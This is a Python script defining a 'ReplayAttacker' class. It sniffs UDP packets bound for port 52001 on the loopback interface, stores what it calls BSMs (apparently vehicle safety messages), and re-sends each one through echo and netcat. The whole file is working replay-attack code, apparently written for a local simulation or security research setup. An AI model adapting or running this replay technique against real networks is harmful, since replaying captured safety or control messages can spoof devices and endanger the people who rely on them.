from scapy.all import sniff
import binascii
import subprocess
import time

class ReplayAttacker():
    
    def __init__(self):
        self.storedBSMs = []
    
    def replayAttack(self, howLongToCollect):
        self.collect(howLongToCollect)
        self.replay()
    
    def collect(self, timeout):
        sniff(iface="lo",filter="dst port 52001", prn=lambda x: self.storeMessage(str(binascii.hexlify(x.load))), timeout=timeout)
        #sniff(iface="lo",filter="dst port 52001", prn=lambda x: self.storeMessage(x.load), timeout=timeout)
        
    def storeMessage(self, message):
        #print(message)
        self.storedBSMs.append(message)
        
    def replay(self):
        for BSM in self.storedBSMs:
            #BSM = BSM.decode('utf-8')
            #BSM = b'\\x' + b'\\x'.join(BSM[i:i+2] for i in range(0, len(BSM), 2))
            BSM = BSM[2:len(BSM)-2]
            BSM = "\\x" + "\\x".join(BSM[i:i+2] for i in range(0, len(BSM), 2))
            print("replay:\t" + BSM)
            loader = subprocess.Popen(("echo","-n","-e",BSM), stdout=subprocess.PIPE)
            sender = subprocess.check_output(("nc","-w0","-u","localhost","52001"),stdin=loader.stdout) 
            print("Replay sent!")
            time.sleep(0.1)